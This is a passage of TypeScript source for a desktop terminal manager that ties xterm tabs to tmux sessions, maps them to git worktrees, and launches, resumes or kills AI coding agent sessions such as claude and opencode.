        navigator.clipboard.writeText(term.getSelection()).catch(console.error);
        return false;
      }
      if (e.key === "ArrowLeft") return send("\x01"); // line start (Ctrl-A)
      if (e.key === "ArrowRight") return send("\x05"); // line end (Ctrl-E)
      if (e.key === "Backspace") return send("\x15"); // kill to line start (Ctrl-U)
    }
    return true;
  });

  // Fit AFTER layout so the pty spawns at the real grid size, not the pre-layout
  // 80x24 default that leaves full-screen TUIs (opencode) clipped.
  const command = opts.command ?? QUICK_CMD[name] ?? null;
  const cwd = opts.cwd ?? null;
  recordTab(name, command, cwd); // survives reload; tmux session outlives the webview
  requestAnimationFrame(() => {
    fit.fit();
    const { cols, rows } = term;
    invoke("open_session", { id, name, command, cwd, cols, rows }).catch(console.error);
  });

  // Hand the host element to dockview as a flat, draggable/splittable panel.
  // Adding it makes it active, which fires onTermActivate -> onTermShown.
  addTermPanel(id, tabTitle(name), el);
  activate(id);
  if (store.get().pinnedTabs.length) reflowPinnedTabs();
}

// Make a terminal the active dockview panel. The store/active-sync + focus is
// done in onTermShown when dockview reports the active change.
function activate(id: string) {
  if (tabs.has(id)) focusTermPanel(id);
}

// Focus a terminal reliably across a tab switch. A single rAF races dockview:
// the panel may still be hidden that frame (focus on a display:none element is a
// no-op) and dockview can move focus right after. Retry on rAF + a short timeout
// so the keyboard (and keyboard scroll) land in the panel body without a click.
function focusTermSoon(id: string) {
  const go = () => tabs.get(id)?.term.focus();
  requestAnimationFrame(go);
  setTimeout(go, 60);
}

// dockview reports a terminal panel became active (tab click, open, or a
// neighbour closing). Sync the store, log the visit, refit, focus.
function onTermShown(id: string) {
  const t = tabs.get(id);
  if (!t) return;
  setActive(id);
  touchTab(id);
  logTabVisit(t.name);
  void warmTurns(id); // warm the ledger so right-click turn-identify stays sync
  requestAnimationFrame(() => {
    t.fit.fit();
    invoke("resize_pty", { id, cols: t.term.cols, rows: t.term.rows }).catch(() => {});
  });
  focusTermSoon(id);
  renderSessionActive();
}

// Close a terminal: remove its dockview panel; dockview then fires
// onDidRemovePanel -> onTermClosed which disposes the xterm + pty.
function closeTab(id: string) {
  if (tabs.has(id)) removeTermPanel(id);
}

// dockview removed a terminal panel (close button, menu, or closeTab). Tear
// down the live resources and re-point active at a surviving terminal.
function onTermClosed(id: string) {
  const t = tabs.get(id);
  if (!t) return;
  const name = t.name;
  // Capture before teardown: cwd/command + the live foreground proc decide
  // whether this is an agent tab to EXIT (free RAM) vs a shell we just detach.
  const tabMeta = tabMetaById(id);
  const live = store.get().sessions.find((s) => s.name === name);
  const proc = foregroundProc(live?.commands ?? []);
  t.term.dispose();
  t.el.remove();
  tabs.delete(id);
  // Remember it for reopen (⌘⇧T), carrying the original command/cwd.
  const meta = store.get().openTabs.find((o) => o.name === name);
  closedTabs.push({ name, command: meta?.command ?? null, cwd: meta?.cwd ?? null });
  // The exact cwds ⌘⇧T can key on: the pane cwd where the agent ran (tabMeta.cwd)
  // and the path the tab was opened with (openTabs.cwd, what closedTabs stores as
  // last.cwd). Captured NOW, before forgetTab clears the record. Kept precise (no
  // enclosing-worktree widening) so two tabs in the same repo don't cross-resume.
  const recordKeys = [
    ...(tabMeta ? [tabMeta.cwd] : []),
    ...(meta?.cwd ? [meta.cwd] : []),
  ];
  forgetTab(id); // don't reattach a tab the user closed
  // Agent tab → kill the tmux session so claude/opencode isn't left burning RAM
  // (recording its id for --resume first). Anything else → detach the pty; the
  // tmux session survives (so a reload reattaches it). Decided async because the
  // on-disk session probe is async; see exitOrDetachTab.
  void exitOrDetachTab(id, name, tabMeta, proc, recordKeys);
  if (activeId() === id) {
    const next = tabs.keys().next();
    const nextId = next.done ? null : next.value;
    setActive(nextId);
    if (nextId) activate(nextId);
  }
  renderSessionActive();
  refreshSessions();
}

// Decide a closed tab's fate: an agent tab is KILLED (frees the RAM claude/
// opencode hold) after best-effort recording its session id for --resume;
// anything else just detaches (tmux survives a reload). The kill fires whenever
// we believe an agent is running — it is NOT gated on resolving the session id,
// so a stale id lookup can't leave claude alive. The agent writes its jsonl
// incrementally, so killing mid-run stays resumable.
async function exitOrDetachTab(
  id: string,
  name: string,
  meta: { cwd: string; command: string | null } | null,
  proc: string,
  recordKeys: string[] = [],
) {
  const sessions = meta ? await tabSessions(meta.cwd, meta.command) : [];
  const bin = (meta?.command ?? "").trim().split(/\s+/)[0]?.split("/").pop() ?? "";
  // Agent when: the live foreground proc is an agent; the launch command names
  // one; or the proc was unknown (stale session list) but the cwd has an on-disk
  // agent session. A known non-agent proc (vim, …) is never killed.
  const isAgent =
    AGENT_PROCS.has(proc) || KNOWN_RESUME[bin] != null || (proc === "" && sessions.length > 0);
  if (!isAgent) {
    invoke("close_pty", { id }).catch(() => {}); // tmux session keeps running
    return;
  }
  const s = sessions[0]; // declared-agent-first, latest
  if (s && meta) {
    // Key by cwd (reopen mints a fresh tmux name, so name keys never recur).
    // Record only under the precise cwds ⌘⇧T will look up (recordKeys), so a
    // reopen resumes the tab actually closed and nothing else.
    const val = { editor: s.editor, sessionId: s.sessionId };
    const keys = new Set<string>([meta.cwd, ...recordKeys].filter(Boolean));
    const next = { ...store.get().resumeTabs };
    for (const k of keys) next[k] = val;
    store.set({ resumeTabs: next });
    console.log("[resume] recorded", s.editor, s.sessionId.slice(0, 8), "under", [...keys]);
  } else {
    console.log("[resume] NOT recorded (no session id) for", name, "cwd", meta?.cwd);
  }
  await invoke("kill_session", { name }).catch(console.error); // kill regardless of id resolution
  refreshSessions();
}

// Refit one terminal (dockview reports its panel group resized).
function fitTerm(id: string) {
  const t = tabs.get(id);
  if (!t) return;
  t.fit.fit();
  invoke("resize_pty", { id, cols: t.term.cols, rows: t.term.rows }).catch(() => {});
}

function renderSessionActive() {
  document.querySelectorAll<HTMLLIElement>(".sidebar-lists li").forEach((li) => {
    const id = li.dataset.id;
    li.classList.toggle("active", !!id && id === activeId());
  });
}

// Map pane cwds to worktrees by longest-prefix match against scanned rows.
// Returns the distinct worktree paths those cwds fall under.
function worktreesForPaths(paths: string[], rows: WorktreeRow[]): string[] {
  const out = new Set<string>();
  for (const cwd of paths) {
    let best: WorktreeRow | undefined;
    for (const w of rows) {
      if (cwd === w.worktree || cwd.startsWith(w.worktree + "/")) {
        if (!best || w.worktree.length > best.worktree.length) best = w;
      }
    }
    if (best) out.add(best.worktree);
  }
  return [...out];
}

// The sidebar SESSIONS list mirrors the live tmux sessions (the real running
// shells/agents), not a creator. Click a row to attach/resume it into a tab;
// launching new ones is the job of the quick-launch buttons + new-shell input.
// Order the launcher rows per store.sessionSort. Name is the stable tiebreak.
function sortSessions(live: Session[]): Session[] {
  const { key, dir } = store.get().sessionSort;
  const pinned = new Set(store.get().pinnedSessions);
  const sign = dir === "asc" ? 1 : -1;
  return [...live].sort((a, b) => {
    // Pinned sessions always float to the top, regardless of the sort key.
    const pa = pinned.has(a.name) ? 0 : 1;
    const pb = pinned.has(b.name) ? 0 : 1;
    if (pa !== pb) return pa - pb;
    let c = 0;
    if (key === "name") c = a.name.localeCompare(b.name, undefined, { numeric: true });
    else if (key === "windows") c = a.windows - b.windows;
    else c = a.activity - b.activity;
    return c !== 0 ? c * sign : a.name.localeCompare(b.name, undefined, { numeric: true });
  });
}

// Shells aren't interesting as a "what's running here" label; surface the agent
// or tool instead. Returns the first non-shell foreground command, else "".
const SHELLS = new Set(["zsh", "bash", "fish", "sh", "tmux", "-zsh", "-bash"]);
function foregroundProc(commands: string[]): string {
  return commands.find((c) => !SHELLS.has(c)) ?? "";
}
// Foreground procs that mean "an agent is running here" (vs an idle shell), so
// closing the tab exits it instead of leaving it resident. node/bun cover
// claude/opencode launched through their JS shim.
const AGENT_PROCS = new Set(["claude", "opencode", "node", "bun"]);
const isPinnedSession = (name: string) => store.get().pinnedSessions.includes(name);
function togglePinSession(name: string) {
  const cur = store.get().pinnedSessions;
  store.set({
    pinnedSessions: cur.includes(name) ? cur.filter((n) => n !== name) : [...cur, name],
  });
  refreshSessions();
}

async function refreshSessions() {
  let live: Session[] = [];
  try {
    live = await invoke<Session[]>("list_sessions");
  } catch (e) {
    console.error(e);
  }

  // Relate sessions to worktrees and accumulate the touched set (persisted).
  // Pure data; runs even when the panel is closed.
  const rows = store.get().worktrees;
  const sw = { ...store.get().sessionWorktrees };
  for (const s of live) {
    const matched = worktreesForPaths(s.paths ?? [], rows);
    if (matched.length)
      sw[s.name] = [...new Set([...(sw[s.name] ?? []), ...matched])];
  }
  store.set({ sessions: live, sessionWorktrees: sw });

  const countEl = document.querySelector("#session-count");
  // Query the list element fresh each call: it's created by injectPanelHtml
  // AFTER this module loads, so a module-level ref would be null forever (this
  // was the "no session list" bug — the render bailed every time).
  const listEl = document.querySelector<HTMLUListElement>("#session-list");
  if (!countEl || !listEl) return; // panel DOM not mounted yet; a later show re-runs
  countEl.textContent = live.length ? String(live.length) : "";

  // Reflect the persisted sort in the control, then render in that order.
  const sortSel = document.querySelector<HTMLSelectElement>("#session-sort");
  if (sortSel) {
    const { key, dir } = store.get().sessionSort;
    sortSel.value = `${key}:${dir}`;
  }

  listEl.innerHTML = "";
  if (live.length === 0) {
    const li = document.createElement("li");
    li.className = "session-empty";
    li.textContent = "no live sessions — launch one below";
    listEl.appendChild(li);
  }
  for (const s of sortSessions(live)) {
    const open = tabs.has(sessionId(s.name));
    const current = new Set(worktreesForPaths(s.paths ?? [], rows)); // where it is now
    const chips = (sw[s.name] ?? [])
      .map((p) => {
        const w = rows.find((r) => r.worktree === p);
        const label = w ? w.branch : baseName(p);
        return `<span class="wt-chip${current.has(p) ? " current" : ""}" title="${p}">${label}</span>`;
      })
      .join("");
    const proc = foregroundProc(s.commands ?? []);
    const pwd = (s.paths ?? [])[0]; // a representative cwd for this session
    const pinned = isPinnedSession(s.name);
    const li = document.createElement("li");
    li.dataset.id = sessionId(s.name);
    li.className = "session" + (pinned ? " pinned" : "");
    li.innerHTML = `<span class="dot ${s.attached ? "on" : ""}"></span>
      <span class="s-name">${s.name}</span>
      ${proc ? `<span class="s-proc" title="foreground process">${proc}</span>` : ""}
      <span class="s-meta">${s.windows}w${open ? " · open" : ""}</span>
      ${pwd ? `<span class="s-pwd" title="${pwd}">${tildify(pwd)}</span>` : ""}
      ${chips ? `<span class="s-worktrees">${chips}</span>` : ""}`;
    li.onclick = () => openTab(s.name); // attaches (tmux new-session -A) / focuses
    const pin = document.createElement("span");
    pin.className = "s-pin" + (pinned ? " on" : "");
    pin.textContent = pinned ? "📌" : "📍";
    pin.title = pinned ? "unpin" : "pin to top";
    pin.onclick = (e) => {
      e.stopPropagation();
      togglePinSession(s.name);
    };
    li.appendChild(pin);
    const kill = document.createElement("span");
    kill.className = "tab-close";
    kill.textContent = "×";
    kill.title = "kill this tmux session";
    kill.onclick = (e) => {
      e.stopPropagation();
      // closeTab removes the panel + disposes the xterm; then kill the tmux session.
      closeTab(sessionId(s.name));
      invoke("kill_session", { name: s.name })
        .then(() => refreshSessions())
        .catch(console.error);
    };
    li.appendChild(kill);
    listEl.appendChild(li);
  }
  renderSessionActive();
}

// ---- worktrees table: discover existing worktrees across N repo clones ----
const baseName = (p: string) => p.split("/").filter(Boolean).pop() ?? p;
const tmuxName = (s: string) => s.replace(/[.:\s]/g, "-");

// "git@github.com:org/repo.git" / "https://host/org/repo.git" -> "org/repo"
function prettyOrigin(url: string): string {
  if (!url) return "(no remote)";
  const s = url
    .replace(/^git@/, "")
    .replace(/^https?:\/\//, "")
    .replace(/\.git$/, "")
    .replace(":", "/");
  return s.split("/").filter(Boolean).slice(-2).join("/") || s;
}

// Two views over the same rows: a collapsible fs tree, and a flat table.
// Expanded node keys live in the (persisted) store.
type CloneNode = { clone: string; branch: string; worktrees: WorktreeRow[] };
type OrgNode = { origin: string; clones: CloneNode[] };

// org/repo -> clone (fs checkout + its branch) -> worktrees
function buildTree(rows: WorktreeRow[]): OrgNode[] {
  const orgs = new Map<string, Map<string, CloneNode>>();
  for (const r of rows) {
    const okey = r.origin || "(no remote)";
    let clones = orgs.get(okey);
    if (!clones) orgs.set(okey, (clones = new Map()));
    let cn = clones.get(r.clone);
    if (!cn) clones.set(r.clone, (cn = { clone: r.clone, branch: "", worktrees: [] }));
    cn.worktrees.push(r);
    if (r.is_main) cn.branch = r.branch;
  }
  return [...orgs.entries()]
    .sort((a, b) => a[0].localeCompare(b[0]))
    .map(([origin, clones]) => ({
      origin,
      clones: [...clones.values()].sort((a, b) => a.clone.localeCompare(b.clone)),
    }));
}

// The base tmux session name for a worktree (deterministic: same checkout +
// branch always resolves here, so "resume" reattaches the same session).
const baseSessionName = (clone: string, branch: string) =>
  tmuxName(branch ? `${baseName(clone)}-${branch}` : baseName(clone));

// A session name not already taken, so "new session" on a worktree spawns a
// second/third session instead of reattaching the first. Considers BOTH live
// tmux sessions AND currently-open tabs — store.sessions can be stale between
// refreshes, and a just-opened tab won't be in it yet, so without the tabs
// union a "new" name collides with the base and openTab just re-focuses it.
// Returns the base name when it's free, else base-2, base-3, …
function freshSessionName(clone: string, branch: string): string {
  const base = baseSessionName(clone, branch);
  const taken = new Set<string>([
    ...store.get().sessions.map((s) => s.name),
    ...[...tabs.values()].map((t) => t.name),
  ]);
  if (!taken.has(base)) return base;
  let n = 2;
  while (taken.has(`${base}-${n}`)) n++;
  return `${base}-${n}`;
}

// Open a tmux session for a worktree, optionally launching an agent the first
// time it's created. `fresh` forces a brand-new session (suffixed name) even
// when one already exists here; otherwise reattach/create the base session.
async function openWorktree(
  clone: string,
  branch: string,
  wtPath: string,
  command?: string,
  fresh = false,
) {
  const name = fresh ? freshSessionName(clone, branch) : baseSessionName(clone, branch);
  openTab(name, { cwd: wtPath, command: await resumeCommand(command, wtPath) });
  refreshSessions();
}

// Turn a bare agent command into a resume-aware one for `cwd`: when autoResume
// is on and the matching agent declares a resume flag, ask the backend for the
// latest harness session id in this cwd and append `<flag> <id>` so the agent
// continues its last conversation. No id (fresh worktree) -> launch blank.
async function resumeCommand(
  command: string | undefined,
  cwd: string,
): Promise<string | undefined> {
  if (!command) return command;
  const agent = store.get().wtAgents.find((a) => a.command === command);
  if (!agent?.resume) return command;
  const tool = command.trim().split(/\s+/)[0];
  // "new · X" / double-click are explicitly NEW sessions: only resume when the
  // user opted into "auto-resume latest". The killed-on-close record is reserved
  // for the ⌘⇧T reopen gesture (see reopenLastTab), so opening a new session in a
  // worktree you just closed an agent in doesn't silently reattach.
  if (!store.get().autoResume) return command;
  const id = await invoke<string | null>("harness_session", { tool, cwd }).catch(() => null);
  return id ? `${command} ${agent.resume} ${id}` : command;
}

// Resume flag per known harness binary; auto-attached so the simple text editor
// ("label:command") still gets resume support without extra syntax.
const KNOWN_RESUME: Record<string, string> = {
  claude: "--resume",
  opencode: "--session",
};

// Relaunch command for a previously-exited agent tab: "claude --resume <id>" /
// "opencode --session <id>".
const resumeLaunch = (editor: "claude" | "opencode", sessionId: string) =>
  `${editor} ${KNOWN_RESUME[editor]} ${sessionId}`;

// Parse the inline agent-list editor: "claude:claude, vim:nvim ." -> WtAgent[].
// Each entry is "label:command"; a bare token is used as both label and command.
function parseWtAgents(text: string): WtAgent[] {
  return text
    .split(/[\n,]/)
    .map((s) => s.trim())
    .filter(Boolean)
    .map((tok) => {
      const i = tok.indexOf(":");
      const a =
        i < 0
          ? { label: tok, command: tok }
          : { label: tok.slice(0, i).trim(), command: tok.slice(i + 1).trim() };
      const bin = a.command.trim().split(/\s+/)[0].split("/").pop() ?? "";
      return KNOWN_RESUME[bin] ? { ...a, resume: KNOWN_RESUME[bin] } : a;
    })
    .filter((a) => a.label && a.command);
}

// The full chooser for a worktree, anchored at (x,y). Lists every existing
// session here so you can resume a SPECIFIC one (not just the latest), then the
// "new session" options per configured agent + a plain shell. This is the one
// menu used by single click, right click, and the "open ▾" button so the
// reuse-vs-new decision is always explicit.
function showAgentMenu(
  x: number,
  y: number,
  clone: string,
  branch: string,
  wtPath: string,
  dirty: boolean,
) {
  const live = sessionsForWorktree(wtPath);
  const items: CtxItem[] = [];
  for (const s of live) {
    const proc = foregroundProc(s.commands ?? []);
    items.push({
      label: `resume · ${s.name}${proc ? ` (${proc})` : ""}`,
      action: () => openTab(s.name),
    });
  }
  if (live.length) items.push({ sep: true });
  for (const a of store.get().wtAgents) {
    items.push({
      label: `new · ${a.label}`,
      action: () => openWorktree(clone, branch, wtPath, a.command, true),
    });
  }
  items.push({
    label: dirty ? "new shell · uncommitted changes" : "new shell",
    action: () => openWorktree(clone, branch, wtPath, undefined, true),
  });
  items.push({ sep: true });
  items.push({
    label: isFavWorktree(wtPath) ? "★ unfavorite" : "☆ favorite",
    action: () => toggleFavWorktree(wtPath),
  });
  items.push({
    label: `${store.get().autoResume ? "✓" : "○"} auto-resume latest`,
    action: () => store.set({ autoResume: !store.get().autoResume }),
  });
  items.push({ label: "edit agents…", action: openWtAgentsEditor });
  showContextMenu(x, y, items);
}

// Default-agent launch (first configured agent) for the double-click gesture.
function openWorktreeDefault(clone: string, branch: string, wtPath: string) {
  const agent = store.get().wtAgents[0];
  openWorktree(clone, branch, wtPath, agent?.command, true);
}

// ---- favorites (stars) + focus filter ----
// Favorites are keyed by an absolute fs path, so ANY path-bearing row is
// favoritable: a git worktree leaf, a clone (main checkout), or a non-git space.
// (wtFavorites is the persisted path list; the name is historical.)
const isFavWorktree = (path: string) => store.get().wtFavorites.includes(path);
function toggleFavWorktree(path: string) {
  if (!path) return;
  const cur = store.get().wtFavorites;
  store.set({
    wtFavorites: cur.includes(path)
      ? cur.filter((p) => p !== path)
      : [...cur, path],
  });
  renderWorktreesPanel();
}
// When focus is on, keep only starred worktrees (and any whose row is needed to
// reach them). buildTree/renderFlatTable both consume the filtered rows.
function focusRows(rows: WorktreeRow[]): WorktreeRow[] {
  if (!store.get().wtFocus) return rows;
  const favs = new Set(store.get().wtFavorites);
  return rows.filter((r) => favs.has(r.worktree));
}

// Focus mode is a FLAT list: one row per favorited path, labeled with its full
// (tildified) path so the whole lineage is legible regardless of tree depth.
// Git metadata (branch/head/dirty/clone) is filled from the scan when the path
// is a known worktree; otherwise the path renders as a bare leaf. Live sessions
// nest underneath, same as the tree.
function favRows(): WtTreeRow[] {
  const wts = store.get().worktrees;
  const spaces = new Set(store.get().spaces);
  return store.get().wtFavorites.map((path) => {
    const wt = wts.find((w) => w.worktree === path || w.clone === path);
    return {
      id: path,
      kind: "leaf" as const,
      label: tildify(path), // full path, not just the basename
      space: spaces.has(path),
      clonePath: wt?.clone ?? path,
      worktree: path,
      branch: wt?.branch ?? "",
      head: wt?.head ?? "",
      pathDisplay: tildify(path),
      dirty: wt?.dirty ?? false,
      fav: true,
      favPath: path,
      children: sessionChildRows(path),
    };
  });
}

// Buffered click vs double-click on a worktree leaf. Single click waits ~220ms
// so a double-click can preempt it; double-click and right-click open a NEW
// session, single click resumes an existing one (or opens the picker if none).
const CLICK_BUFFER_MS = 220;
let leafClickTimer: number | null = null;
function clearLeafClick() {
  if (leafClickTimer !== null) {
    clearTimeout(leafClickTimer);
    leafClickTimer = null;
  }
}

// The three gestures shared by tree leaves and flat-table rows:
//   single click (buffered): open the chooser (resume a specific session / new)
//   double click: skip the menu, open a brand-new session with the default agent
//   right click: same chooser as single click
// Single and right both go through showAgentMenu so the reuse-vs-new choice is
// always explicit — never silently attach the latest session.
function leafGestures(clone: string, branch: string, wtPath: string, dirty: boolean) {
  return {
    onSingle: (x: number, y: number) => {
      clearLeafClick();
      leafClickTimer = window.setTimeout(() => {
        leafClickTimer = null;
        showAgentMenu(x, y, clone, branch, wtPath, dirty);
      }, CLICK_BUFFER_MS);
    },
    onDouble: () => {
      clearLeafClick();
      openWorktreeDefault(clone, branch, wtPath);
    },
    onContext: (x: number, y: number) => {
      clearLeafClick();
      showAgentMenu(x, y, clone, branch, wtPath, dirty);
    },
  };
}

// ---- v2 react-table panel bridges ----
// Derivation + handlers live here (next to the existing session/worktree logic);
// the React panels (tablepanels.tsx) are presentational and pull rows() lazily.
// Registering these bridges once is enough: rows() reads the store on each call,
// and useApp() in the panels triggers the re-render that re-invokes rows().
function tmuxRows(): TmuxRow[] {
  const rows = store.get().worktrees;
  const sw = store.get().sessionWorktrees;
  return sortSessions(store.get().sessions).map((s) => {
    const current = new Set(worktreesForPaths(s.paths ?? [], rows));
    const chips = (sw[s.name] ?? []).map((p) => {
      const w = rows.find((r) => r.worktree === p);
      return { label: w ? w.branch : baseName(p), current: current.has(p), path: p };
    });
    const pwd = (s.paths ?? [])[0];
    return {
      name: s.name,
      attached: s.attached,
      proc: foregroundProc(s.commands ?? []),
      windows: s.windows,
      open: tabs.has(sessionId(s.name)),
      pwd: pwd ? tildify(pwd) : "",
      chips,
      pinned: isPinnedSession(s.name),
    };
  });
}

// Display-ready tree rows (org → clone → worktree-leaf) for the react-table
// worktrees panel. Mirrors the v1 renderTree hierarchy via buildTree; the React
// panel indents the name column + chevron (MUI-X tree-data style) and renders
// the per-row star / open / resume / +worktree actions from these fields.
// Live tmux sessions sitting in `wtPath` as session child rows. Shared by git
// worktree leaves and non-git space leaves so both show "what's running where".
function sessionChildRows(wtPath: string): WtTreeRow[] {
  return sessionsForWorktree(wtPath).map((s) => ({
    id: `${wtPath}::sess:${s.name}`,
    kind: "session" as const,
    label: s.name,
    sessionName: s.name,
    attached: s.attached,
    proc: foregroundProc(s.commands ?? []),
    windows: s.windows,
    open: tabs.has(sessionId(s.name)),
  }));
}

// Synthetic top-level "Spaces" org: user-added non-git folders, each a leaf that
// opens an AI session in that folder (clone/branch empty → name = folder base).
function spaceTreeRows(): WtTreeRow[] {
  const spaces = store.get().spaces;
  if (!spaces.length) return [];
  return [
    {
      id: "o:spaces",
      kind: "org",
      label: "📁 Spaces",
      meta: `${spaces.length} folder${spaces.length > 1 ? "s" : ""}`,
      children: spaces.map((p) => ({
        id: `space:${p}`,
        kind: "leaf",
        label: baseName(p),
        space: true,
        clonePath: p, // gestures pass this as `clone` → session cwd
        worktree: p, // gesture key + fav + sessions + drag entity
        branch: "",
        pathDisplay: tildify(p),
        dirty: false,
        fav: isFavWorktree(p),
        favPath: p,
        children: sessionChildRows(p),
      })),
    },
  ];
}

function wtTreeRows(): WtTreeRow[] {
  // Focus mode flattens to the favorites list (full paths), bypassing the tree.
  if (store.get().wtFocus) return favRows();
  const rows = store.get().worktrees;
  const adding = store.get().wtAddingClone;
  return spaceTreeRows().concat(buildTree(rows).map((org) => ({
    id: `o:${org.origin}`,
    kind: "org",
    label: prettyOrigin(org.origin),
    meta: `${org.clones.length} clone${org.clones.length > 1 ? "s" : ""}`,
    children: org.clones.map((cl) => ({
      id: `o:${org.origin}|c:${cl.clone}`,
      kind: "clone",
      label: baseName(cl.clone),
      meta: cl.branch ? `@${cl.branch}` : "",
      clonePath: cl.clone,
      fav: isFavWorktree(cl.clone),
      favPath: cl.clone,
      adding: adding === cl.clone,
      children: cl.worktrees.map((wt) => ({
        id: wt.worktree,
        kind: "leaf",
        label: wt.is_main ? "(main)" : baseName(wt.worktree),
        clonePath: cl.clone,
        worktree: wt.worktree,
        branch: wt.branch,
        head: wt.head,
        pathDisplay: tildify(wt.worktree),
        dirty: wt.dirty,
        fav: isFavWorktree(wt.worktree),
        favPath: wt.worktree,
        // Live tmux sessions sitting in this worktree show as child rows, so the
        // tree doubles as "what's running where". Empty → leaf has no twisty.
        children: sessionChildRows(wt.worktree),
      })),
    })),
  })));
}

// Gestures for a leaf tree row (single/dbl/right-click → agent chooser).
const wtLeafGestures = (r: WtTreeRow) =>
  leafGestures(r.clonePath ?? "", r.branch ?? "", r.worktree ?? "", !!r.dirty);

function registerV2Bridges() {
  setTmuxPanel({
    rows: tmuxRows,
    onOpen: (name) => openTab(name),
    onPin: (name) => togglePinSession(name),
    onShow: () => refreshSessions(),
    sort: () => store.get().sessionSort,
    setSort: (s) => store.set({ sessionSort: s }),
    launch: (command) => {
      openTab(command, { command });
      refreshSessions();
    },
    newShell: (name) => {
      openTab(name);
      refreshSessions();
    },
  });
  setWorktreesPanel({
    treeRows: wtTreeRows,
    onShow: () => { if (store.get().worktrees.length === 0) scanWorktrees(); },
    scanRoot: () => store.get().scanRoot,
    scan: (root) => {
      store.set({ scanRoot: root });
      scanWorktrees();
    },
    focus: () => store.get().wtFocus,
    toggleFocus: () => store.set({ wtFocus: !store.get().wtFocus }),
    counts: () => {
      const { worktrees, wtFavorites } = store.get();
      return {
        shown: worktrees.filter((r) => wtFavorites.includes(r.worktree)).length,
        total: worktrees.length,
      };
    },
    // Persisted expand state: store.wtExpanded is a flat list of expanded node
    // ids; convert to/from react-table's ExpandedState record on the boundary.
    expanded: () => Object.fromEntries(store.get().wtExpanded.map((k) => [k, true])),
    setExpanded: (e) => {
      const keys = e === true ? [] : Object.keys(e).filter((k) => (e as Record<string, boolean>)[k]);
      store.set({ wtExpanded: keys });
    },
    // leaf gestures (single/dbl/right-click → chooser) + the open ▾ anchored menu.
    onLeafSingle: (r, x, y) => wtLeafGestures(r).onSingle(x, y),
    onLeafDouble: (r) => wtLeafGestures(r).onDouble(),
    onLeafContext: (r, x, y) =>
      r.space ? showSpaceMenu(r, x, y) : wtLeafGestures(r).onContext(x, y),
    onLeafMenu: (r, x, y) =>
      showAgentMenu(x, y, r.clonePath ?? "", r.branch ?? "", r.worktree ?? "", !!r.dirty),
    onResume: (name) => openTab(name),
    onKill: (name) => {
      closeTab(sessionId(name)); // drop the panel + dispose xterm, then kill tmux
      invoke("kill_session", { name })
        .then(() => refreshSessions())
        .catch(console.error);
    },
    toggleFav: (path) => toggleFavWorktree(path),
    // inline "+ worktree" branch input on a clone row.
    revealAdd: (clonePath) => store.set({ wtAddingClone: clonePath }),
    submitAdd: (clonePath, branch) => submitAddWorktree(clonePath, branch),
    cancelAdd: () => store.set({ wtAddingClone: null }),
    addSpace: (path) => addSpace(path),
    removeSpace: (path) => removeSpace(path),
  });
}

// ---- spaces (non-git AI-session folders) ----
function addSpace(path: string) {
  const p = path.trim();
  if (!p) return;
  const cur = store.get().spaces;
  if (!cur.includes(p)) store.set({ spaces: [...cur, p] });
}
function removeSpace(path: string) {
  store.set({ spaces: store.get().spaces.filter((p) => p !== path) });
}
// Right-click chooser for a space leaf: same agent options as a worktree, plus
// "remove space" (clone=branch empty so the session name is the folder base).
function showSpaceMenu(r: WtTreeRow, x: number, y: number) {
  const path = r.worktree ?? "";
  const live = sessionsForWorktree(path);
  const items: CtxItem[] = [];
  for (const s of live) {
    const proc = foregroundProc(s.commands ?? []);
    items.push({
      label: `resume · ${s.name}${proc ? ` (${proc})` : ""}`,
      action: () => openTab(s.name),
    });
  }
  if (live.length) items.push({ sep: true });
  for (const a of store.get().wtAgents) {
    items.push({
      label: `new · ${a.label}`,
      action: () => openWorktree(path, "", path, a.command, true),
    });
  }
  items.push({ label: "new shell", action: () => openWorktree(path, "", path, undefined, true) });
  items.push({ sep: true });
  items.push({
    label: isFavWorktree(path) ? "★ unfavorite" : "☆ favorite",
    action: () => toggleFavWorktree(path),
  });
  items.push({ label: "remove space", action: () => removeSpace(path) });
  showContextMenu(x, y, items);
}

// Reveal the inline agent-list editor in the worktree panel header, seeded with
// the current list as "label:command" tokens. Enter commits, Esc cancels.
let wtAgentsEditing = false;
function openWtAgentsEditor() {
  wtAgentsEditing = true;
  renderWorktreesPanel();
}
function wtAgentsToText(agents: WtAgent[]): string {
  return agents.map((a) => (a.label === a.command ? a.label : `${a.label}:${a.command}`)).join(", ");
}
// Render (or tear down) the inline agent-list editor in the panel header.
function renderWtAgentsEditor() {
  const host = document.querySelector<HTMLElement>("#wt-agents");
  if (!host) return;
  if (!wtAgentsEditing) {
    host.innerHTML = "";
    return;
  }
  host.innerHTML = "";
  const inp = document.createElement("input");
  inp.className = "wt-add-input";
  inp.placeholder = "label:command, … (e.g. claude, sonnet:claude --model sonnet)";
  inp.value = wtAgentsToText(store.get().wtAgents);
  const commit = () => {
    const parsed = parseWtAgents(inp.value);
    if (parsed.length) store.set({ wtAgents: parsed });
    wtAgentsEditing = false;
    renderWorktreesPanel();
  };
  inp.onkeydown = (e) => {
    if (e.key === "Enter") commit();
    else if (e.key === "Escape") {
      wtAgentsEditing = false;
      renderWorktreesPanel();
    }
  };
  inp.onblur = commit;
  host.appendChild(inp);
  queueMicrotask(() => inp.focus());
}

// Live tmux sessions whose panes currently sit inside `wtPath` — the candidates
// for "resume existing" on a worktree row.
function sessionsForWorktree(wtPath: string): Session[] {
  return store.get().sessions.filter((s) =>
    (s.paths ?? []).some((p) => p === wtPath || p.startsWith(wtPath + "/")),
  );
}

// Which checkout row is mid-add (its branch input is showing) lives in the store
// (store.wtAddingClone) so the React worktrees tree re-renders when it changes.
function submitAddWorktree(clone: string, branch: string) {
  if (!branch) {
    store.set({ wtAddingClone: null });
    return;
  }
  invoke<string>("add_worktree", { repo: clone, branch })
    .then(() => {
      store.set({ wtAddingClone: null });
      return scanWorktrees(); // rescan picks up the new worktree row
    })
    .catch((e) => showError("worktree", String(e)));
}

// A trailing row action: a small button on the right edge of a tree row. The
// `menu` variant opens a context menu anchored to the button (the AI picker).
type RowAction = {
  label: string;
  title: string;
  cls?: string;
  onClick: (anchor: HTMLElement) => void;
};

function treeNode(opts: {
  depth: number;
  glyph: "+" | "-" | "";
  label: string;
  meta?: string;
  multi?: boolean;
  dirty?: boolean;
  // A leading ☆/★ toggle (worktree leaves only). `on` drives the filled glyph.
  star?: { on: boolean; onToggle: () => void };
  // Full filepath shown dim after the meta (worktree leaves), title on hover.
  path?: string;
  onGlyph?: () => void;
  onLabel?: (e: MouseEvent) => void;
  onDblClick?: (e: MouseEvent) => void;
  onContextMenu?: (e: MouseEvent) => void;
  actions?: RowAction[];
  // Inline editor shown in place of the meta (e.g. the new-worktree branch
